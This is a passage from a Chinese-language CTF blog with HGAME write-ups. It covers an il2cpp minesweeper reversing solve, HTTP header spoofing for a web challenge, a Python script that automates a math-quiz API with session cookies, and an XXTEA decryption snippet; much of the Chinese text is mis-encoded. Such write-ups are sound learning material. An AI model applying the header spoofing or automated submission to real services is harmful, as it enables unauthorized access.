function">il2cpp_codegen_multiply</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>L_25<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>L_26<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>L_27<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>æˆ‘ä»¬å¯ä»¥å¾ˆå¿«å‘ç°è¿™ä¸ªæ˜¯åˆ¤æ–­æ˜¯å¦æ˜¯åœ°é›·çš„æºç ï¼Œä½†æ˜¯å¾ˆæ˜æ˜¾ï¼Œè¿™ä¹Ÿå¤ªéš¾çœ‹æ‡‚äº†ï¼Œå› æ­¤æˆ‘å»ºè®®ï¼Œä»¥ååè°ƒè¯•ï¼Œåªè¦æŠŠ cpp -&gt; c# -&gt; il -&gt; cpp å°±å¥½äº†ï¼Œä¿è¯å¤§éƒ¨åˆ†äººçœ‹è£‚å¼€ï¼Œä½†æ˜¯æˆ‘ä»¬å…¶å®è¿™é‡Œæœ‰å¦å¤–ä¸€ç§æ€ç»´ï¼Œæºç çœ‹ä¸æ‡‚ï¼Œé‚£çœ‹é€†å‘ å‡ºæ¥çš„ ä¼ªä»£ç  å‘—ã€‚</p>
<p>ida ä¸­å¯ä»¥æœ‰</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">return</span> v9 <span class="token operator">*</span> v11 <span class="token operator">*</span> v11 <span class="token operator">+</span> v11 <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">double</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> v10 <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">double</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> v10 <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0.0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>æˆ‘ä»¬å†ç»“åˆèµ·æ¥çœ‹å…¶å®å°±æ–¹ä¾¿äº†å¾ˆå¤šã€‚</p>
<p>ç»è¿‡æµ‹è¯•åˆ†æï¼Œæœ€åå†™å‡ºè„šæœ¬<br>å…¶ä¸­ data.py å­˜å‚¨ç€ä» AFiveSecondChallenge.dll ä¸­çš„ä¸€ä¸ªæ•°ç»„ç»“æ„ matrix[45][15][3]</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt
<span class="token keyword">import</span> data

x_matrix <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
y_matrix <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
matrix <span class="token operator">=</span> data<span class="token punctuation">.</span>matrix
<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> matrix<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token operator">//</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token punctuation">(</span>x<span class="token operator">%</span><span class="token number">3</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">**</span><span class="token number">2</span> <span class="token operator">+</span> matrix<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token operator">//</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token punctuation">(</span>x<span class="token operator">%</span><span class="token number">3</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> matrix<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token operator">//</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
            x_matrix<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
            y_matrix<span class="token punctuation">.</span>append<span class="token punctuation">(</span>y<span class="token punctuation">)</span>

plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x_matrix<span class="token punctuation">,</span>y_matrix<span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token string">'black'</span><span class="token punctuation">,</span>marker <span class="token operator">=</span> <span class="token string">","</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/QRCODE.jpg" alt="QRCODE"></p>
]]></content>
      <categories>
        <category>HGAME</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>HGAME</tag>
      </tags>
  </entry>
  <entry>
    <title>HGAME_WEEK1_WP</title>
    <url>/2021/03/14/HGAME_WEEK1_WP/</url>
    <content><![CDATA[<h1 id="WEEK1-RogerThat"><a href="#WEEK1-RogerThat" class="headerlink" title="WEEK1-RogerThat"></a>WEEK1-RogerThat</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h4 id="Hitchhiking-in-the-Galaxy"><a href="#Hitchhiking-in-the-Galaxy" class="headerlink" title="Hitchhiking_in_the_Galaxy"></a>Hitchhiking_in_the_Galaxy</h4><h4 id="watermelon"><a href="#watermelon" class="headerlink" title="watermelon"></a>watermelon</h4><p>è¿™ç“œï¼Œå®åœ¨æ˜¯é¡¶ï¼Œä¸€å¼€å§‹æ ¹æœ¬æ‰¾ä¸åˆ°å®ƒåœ¨å“ªå®ç°çš„æ£€æµ‹ã€‚å¦å¤–ä¸€æ–¹é¢ï¼Œç­‰æ£€éªŒåˆ†æ•°çš„æ—¶å€™å·²ç»æ˜¯åˆ°é¡¶äº†ï¼Œä½†æ˜¯åˆ°é¡¶å¯å¤ªæ…¢äº†ï¼Œå°±ç®—ä¸€ä¸ªä¸€ä¸ªå ä¸Šå»ä¹Ÿå¯èƒ½æ‰ä¸‹æ¥ã€‚ä¸Šæˆªå›¾ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/water.jpg" alt="img"></p>
<h4 id="å®è—èµ°ç§è€…"><a href="#å®è—èµ°ç§è€…" class="headerlink" title="å®è—èµ°ç§è€…"></a>å®è—èµ°ç§è€…</h4><p>http-headersï¼Œä¹Ÿä¸æ¸…æ¥šä¸ºä»€ä¹ˆå¤ç°ä¸äº†ï¼Œè®°å¾—æ˜¯æ”¹äº†hostï¼Œrefererï¼ŒX-Forwarded-Forï¼ŒClient-IPã€‚</p>
<h4 id="æ™ºå•†æ£€æµ‹é¸¡ï¼ˆæ¥æ¯”åˆ’æ¯”åˆ’ï¼‰"><a href="#æ™ºå•†æ£€æµ‹é¸¡ï¼ˆæ¥æ¯”åˆ’æ¯”åˆ’ï¼‰" class="headerlink" title="æ™ºå•†æ£€æµ‹é¸¡ï¼ˆæ¥æ¯”åˆ’æ¯”åˆ’ï¼‰"></a>æ™ºå•†æ£€æµ‹é¸¡ï¼ˆæ¥æ¯”åˆ’æ¯”åˆ’ï¼‰</h4><p>æˆ‘çš„æ€è·¯å°±æ˜¯è‡ªåŠ¨å»ç®—ç§¯åˆ†ï¼Œå¥½ä¹…æ²¡ç ä»£ç å®åœ¨æœ‰ç‚¹éš¾é¡¶</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">from</span> sympy <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">import</span> re

x <span class="token operator">=</span> symbols<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span>
a <span class="token operator">=</span> <span class="token number">12</span>
b <span class="token operator">=</span> <span class="token number">8</span>
<span class="token builtin">min</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">77</span>
<span class="token builtin">max</span> <span class="token operator">=</span> <span class="token number">70</span>


url_string1<span class="token operator">=</span><span class="token string">"http://r4u.top:5000/api/verify"</span>
url_string2<span class="token operator">=</span><span class="token string">"http://r4u.top:5000/api/getQuestion"</span>
url_string3<span class="token operator">=</span><span class="token string">"http://r4u.top:5000/api/getStatus"</span>
url_flag <span class="token operator">=</span> <span class="token string">"http://r4u.top:5000/api/getFlag"</span>

answer <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>integrate<span class="token punctuation">(</span><span class="token number">12</span><span class="token operator">*</span>x<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
json <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"answer"</span><span class="token punctuation">:</span>answer<span class="token punctuation">&#125;</span>
session <span class="token operator">=</span> <span class="token string">"eyJzb2x2aW5nIjo2fQ.YBe8WQ.V44K1Uqs_lYXW2vCJUvrQQ0k3DY"</span>
<span class="token comment">#session = "eyJzb2x2aW5nIjo3fQ.YBffyA.NAuV7AWEhJSSb0HLO43yFJqPeMc"</span>
cookies <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>session <span class="token operator">=</span> session<span class="token punctuation">)</span>
headers1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Host'</span><span class="token punctuation">:</span> <span class="token string">'r4u.top:5000'</span><span class="token punctuation">,</span>
            <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0'</span><span class="token punctuation">,</span>
            <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'application/json, text/javascript, */*; q=0.01'</span><span class="token punctuation">,</span>
            <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'en-US,en;q=0.5'</span><span class="token punctuation">,</span>
            <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate'</span><span class="token punctuation">,</span>
            <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json;charset=utf-8'</span><span class="token punctuation">,</span>
            <span class="token string">'Content-Length'</span><span class="token punctuation">:</span> <span class="token string">'30'</span><span class="token punctuation">,</span>
            <span class="token string">'Origin'</span><span class="token punctuation">:</span> <span class="token string">'http://r4u.top:5000'</span><span class="token punctuation">,</span>
            <span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span>
            <span class="token string">'Referer'</span><span class="token punctuation">:</span> <span class="token string">'http://r4u.top:5000/'</span><span class="token punctuation">,</span>
            <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'session='</span><span class="token operator">+</span>session<span class="token punctuation">&#125;</span>

headers2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Host'</span><span class="token punctuation">:</span> <span class="token string">'r4u.top:5000'</span><span class="token punctuation">,</span>
            <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0'</span><span class="token punctuation">,</span>
            <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'application/json, text/javascript, */*; q=0.01'</span><span class="token punctuation">,</span>
            <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'en-US,en;q=0.5'</span><span class="token punctuation">,</span>
            <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate'</span><span class="token punctuation">,</span>
            <span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span>
            <span class="token string">'Referer'</span><span class="token punctuation">:</span> <span class="token string">'http://r4u.top:5000/'</span><span class="token punctuation">,</span>
            <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'session='</span><span class="token operator">+</span>session<span class="token punctuation">&#125;</span>

headers3 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Host'</span><span class="token punctuation">:</span> <span class="token string">'r4u.top:5000'</span><span class="token punctuation">,</span>
            <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0'</span><span class="token punctuation">,</span>
            <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'application/json, text/javascript, */*; q=0.01'</span><span class="token punctuation">,</span>
            <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'en-US,en;q=0.5'</span><span class="token punctuation">,</span>
            <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate'</span><span class="token punctuation">,</span>
            <span class="token string">'X-Requested-With'</span><span class="token punctuation">:</span> <span class="token string">'XMLHttpRequest'</span><span class="token punctuation">,</span>
            <span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span>
            <span class="token string">'Referer'</span><span class="token punctuation">:</span> <span class="token string">'http://r4u.top:5000/'</span><span class="token punctuation">,</span>
            <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'session='</span><span class="token operator">+</span>session<span class="token punctuation">&#125;</span>

target <span class="token operator">=</span> <span class="token string">"&lt;mn>(\d&#123;1,4&#125;)&lt;/mn>"</span>
cookie_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    r2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_string2<span class="token punctuation">,</span>headers <span class="token operator">=</span> headers2<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>
    target_list <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r2<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    a   <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>target_list<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    b   <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>target_list<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token builtin">min</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token builtin">int</span><span class="token punctuation">(</span>target_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token builtin">max</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>target_list<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    answer <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span>integrate<span class="token punctuation">(</span>a<span class="token operator">*</span>x<span class="token operator">+</span>b<span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token builtin">min</span><span class="token punctuation">,</span> <span class="token builtin">max</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    answer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"%.2f"</span> <span class="token operator">%</span> answer<span class="token punctuation">)</span>
    json <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"answer"</span><span class="token punctuation">:</span>answer<span class="token punctuation">&#125;</span>
    cookie_list<span class="token punctuation">.</span>append

    r1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url_string1<span class="token punctuation">,</span>json<span class="token operator">=</span>json<span class="token punctuation">,</span>headers <span class="token operator">=</span> headers1<span class="token punctuation">,</span>stream<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>
    r3 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_string3<span class="token punctuation">,</span>headers <span class="token operator">=</span> headers3<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r1<span class="token punctuation">.</span>text<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r2<span class="token punctuation">.</span>text<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r3<span class="token punctuation">.</span>text<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
    
    <span class="token comment"># "&lt;math>&lt;mrow>&lt;msubsup>&lt;mo>\u222b&lt;/mo>&lt;mrow>&lt;mo>-&lt;/mo>&lt;mn>77&lt;/mn>&lt;/mrow></span>
    <span class="token comment"># &lt;mrow>&lt;mn>70&lt;/mn>&lt;/mrow>&lt;/msubsup>&lt;mo>(&lt;/mo>&lt;mn>12&lt;/mn>&lt;mi>x&lt;/mi>&lt;m</span>
    <span class="token comment"># o>+&lt;/mo>&lt;mn>8&lt;/mn>&lt;mo>)&lt;/mo>&lt;mtext>&lt;mi>d&lt;/mi>&lt;/mtext>&lt;mi>x&lt;/mi>&lt;mtd/>&lt;/mrow>&lt;/math>"</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r1<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get_dict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"session"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> r1<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get_dict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        session <span class="token operator">=</span> r1<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get_dict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"session"</span><span class="token punctuation">]</span>
    cookies <span class="token operator">=</span> r1<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get_dict<span class="token punctuation">(</span><span class="token punctuation">)</span>

    headers1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Host'</span><span class="token punctuation">:</span> <span class="token string">'r4u.top:5000'</span><span class="token punctuation">,</span>
                <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0'</span><span class="token punctuation">,</span>
                <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'application/json, text/javascript, */*; q=0.01'</span><span class="token punctuation">,</span>
                <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'en-US,en;q=0.5'</span><span class="token punctuation">,</span>
                <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate'</span><span class="token punctuation">,</span>
                <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json;charset=utf-8'</span><span class="token punctuation">,</span>
                <span class="token string">'Content-Length'</span><span class="token punctuation">:</span> <span class="token string">'40'</span><span class="token punctuation">,</span>
                <span class="token string">'Origin'</span><span class="token punctuation">:</span> <span class="token string">'http://r4u.top:5000'</span><span class="token punctuation">,</span>
                <span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span>
                <span class="token string">'Referer'</span><span class="token punctuation">:</span> <span class="token string">'http://r4u.top:5000/'</span><span class="token punctuation">,</span>
                <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'session='</span><span class="token operator">+</span>session<span class="token punctuation">&#125;</span>

    headers2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Host'</span><span class="token punctuation">:</span> <span class="token string">'r4u.top:5000'</span><span class="token punctuation">,</span>
                <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0'</span><span class="token punctuation">,</span>
                <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'application/json, text/javascript, */*; q=0.01'</span><span class="token punctuation">,</span>
                <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'en-US,en;q=0.5'</span><span class="token punctuation">,</span>
                <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate'</span><span class="token punctuation">,</span>
                <span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span>
                <span class="token string">'Referer'</span><span class="token punctuation">:</span> <span class="token string">'http://r4u.top:5000/'</span><span class="token punctuation">,</span>
                <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'session='</span><span class="token operator">+</span>session<span class="token punctuation">&#125;</span>

    headers3 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Host'</span><span class="token punctuation">:</span> <span class="token string">'r4u.top:5000'</span><span class="token punctuation">,</span>
                <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0'</span><span class="token punctuation">,</span>
                <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'application/json, text/javascript, */*; q=0.01'</span><span class="token punctuation">,</span>
                <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'en-US,en;q=0.5'</span><span class="token punctuation">,</span>
                <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate'</span><span class="token punctuation">,</span>
                <span class="token string">'X-Requested-With'</span><span class="token punctuation">:</span> <span class="token string">'XMLHttpRequest'</span><span class="token punctuation">,</span>
                <span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span>
                <span class="token string">'Referer'</span><span class="token punctuation">:</span> <span class="token string">'http://r4u.top:5000/'</span><span class="token punctuation">,</span>
                <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'session='</span><span class="token operator">+</span>session<span class="token punctuation">&#125;</span>
    
<span class="token comment">#"flag":"hgame&#123;3very0ne_H4tes_Math&#125;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h4 id="é˜¿æ€•èŒ¶"><a href="#é˜¿æ€•èŒ¶" class="headerlink" title="é˜¿æ€•èŒ¶"></a>é˜¿æ€•èŒ¶</h4><p>æ˜¯ä¸€ä¸ªXXTEAï¼ŒæŠ„è„šæœ¬å®Œäº‹ï¼Œä¸è¿‡ä»–è¿™ä¸ªä¼˜åŒ–çš„å†™æ³•è¿˜æŒºéš¾è¯»çš„ã€‚</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span>  </span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span>  </span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DELTA</span> <span class="token expression"><span class="token number">0x9e3779b9</span>  </span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MX</span> <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z<span class="token operator">>></span><span class="token number">5</span><span class="token operator">^</span>y<span class="token operator">&lt;&lt;</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>y<span class="token operator">>></span><span class="token number">3</span><span class="token operator">^</span>z<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>sum<span class="token operator">^</span>y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>p<span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">^</span>e<span class="token punctuation">]</span> <span class="token operator">^</span> z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  </span></span>
  
<span class="token keyword">void</span> <span class="token function">btea</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> <span class="token operator">*</span>v<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span> <span class="token keyword">const</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  
<span class="token punctuation">&#123;</span>  
    <span class="token class-name">uint32_t</span> y<span class="token punctuation">,</span> z<span class="token punctuation">,</span> sum<span class="token punctuation">;</span>  
    <span class="token keyword">unsigned</span> p<span class="token punctuation">,</span> rounds<span class="token punctuation">,</span> e<span class="token punctuation">;</span>  
    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token comment">/* Coding Part */</span>  
    <span class="token punctuation">&#123;</span>  
        rounds <span class="token operator">=</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">52</span><span class="token operator">/</span>n<span class="token punctuation">;</span>  
        sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  
        z <span class="token operator">=</span> v<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
        <span class="token keyword">do</span>  
        <span class="token punctuation">&#123;</span>  
            sum <span class="token operator">+=</span> DELTA<span class="token punctuation">;</span>  
            e <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>  
